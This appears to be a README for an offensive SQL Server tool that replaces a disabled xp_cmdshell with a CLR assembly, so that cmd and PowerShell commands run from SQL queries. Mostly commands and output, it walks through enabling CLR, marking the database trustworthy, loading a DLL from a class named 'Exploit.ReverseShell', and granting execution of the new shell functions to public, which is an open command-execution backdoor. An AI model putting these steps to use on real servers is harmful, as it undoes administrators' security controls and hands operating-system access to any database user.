# sql-sh.net

Simple cmd/powershell "xp_cmdshell" replacement using SQL Server Common Language Runtime (CLR) support.  Usefull if the DBA disabled or deleted xp_cmdshell, but your connection to the dabase is running as a dbowner, or a sysadmin.

### SQL Server Prerequisites

tldr: If the server isn't setup right, and you're not connected as a sysadmin user, then this method won't work.

SQL Server 2005 introduced the integration of the CLR component of the .NET Framework.  This allows you to run .NET based application within SQL Server with the intent of expanding the functionality of SQL Server for applications.  In order to use the CLR within SQL Server, the server must be configured first, this may have already been done by some applications.

To see if CLR is already available, run ``sp_configure 'clr enabled'``.

```sql
sp_configure 'clr enabled';

name                                minimum     maximum     config_value run_value
----------------------------------- ----------- ----------- ------------ -----------
clr enabled                         0           1           0            0
```

In this case, CLR is disabled, so we need to enable it and then run ``RECONFIGURE`` to apply the change. (requires sysadmin or serveradmin role)

```sql
sp_configure 'clr enabled', 1;

Configuration option 'clr enabled' changed from 0 to 1. Run the RECONFIGURE statement to install.

RECONFIGURE;

Command(s) completed successfully.

sp_configure 'clr enabled'

name                                minimum     maximum     config_value run_value
----------------------------------- ----------- ----------- ------------ -----------
clr enabled                         0           1           1            1
```

Ok, the server is setup, now to set the db as trusted for the .NET assembly.

```sql
SELECT name, is_trustworthy_on FROM sys.databases;

name                                is_trustworthy_on
----------------------------------- -----------------
master                              0
tempdb                              0
model                               0
msdb                                1
AdventureWorks2016                  1
```

If the current database isn't listed with 1 for is_trustworthy_on, run the following to attempt to fix it (requires sysadmin role):
```sql
ALTER DATABASE [AdventureWorks2016] SET Trustworthy ON;
```

### Installing

First, the assembly needs to be added.  Normally you need to install assemblys via an exe/dll on the filesystem, but SQL Server allows you to just give it the ascii hex of the contents.  ;)  Replace the "DATEDBEEF" with the hex contents of the Exploit/bin/Release/Exploit.dll file.

```sql
CREATE ASSEMBLY [Sqlsh] FROM 0xDEADBEEF WITH PERMISSION_SET=EXTERNAL_ACCESS;
```

Then, the assembly needs to be linked to a SQL function.

```sql
CREATE FUNCTION dbo.sqlsh_cmd(@cmd NVARCHAR(max)) RETURNS NVARCHAR(max) EXTERNAL NAME [Sqlsh].[Exploit.ReverseShell].[Cmd]
CREATE FUNCTION dbo.sqlsh_psh(@cmd NVARCHAR(max)) RETURNS NVARCHAR(max) EXTERNAL NAME [Sqlsh].[Exploit.ReverseShell].[Powershell]
GRANT EXECUTE ON dbo.sqlsh_cmd TO public;
GRANT EXECUTE ON dbo.sqlsh_psh TO public;
```

### Examples

Functions are allowed in a lot of sql contexts, so there are many ways to run a script:

```sql
SELECT dbo.sqlsh_cmd('whoami');

INSERT INTO sometable (col1, col2, col3) VALUES (1, 'something', dbo.sqlsh_cmd('whoami'));

UPDATE sometable SET col3 = dbo.sqlsh_cmd('whoami') WHERE col2 = 'something';

DELETE FROM sometable WHERE col3 = dbo.sqlsh_cmd('whoami');
```

### References for SQL CLR

- https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/sql-server-common-language-runtime-integration
- https://docs.microsoft.com/en-us/sql/t-sql/statements/create-assembly-transact-sql?view=sql-server-2017
- https://docs.microsoft.com/en-us/sql/t-sql/statements/create-function-transact-sql?view=sql-server-2017



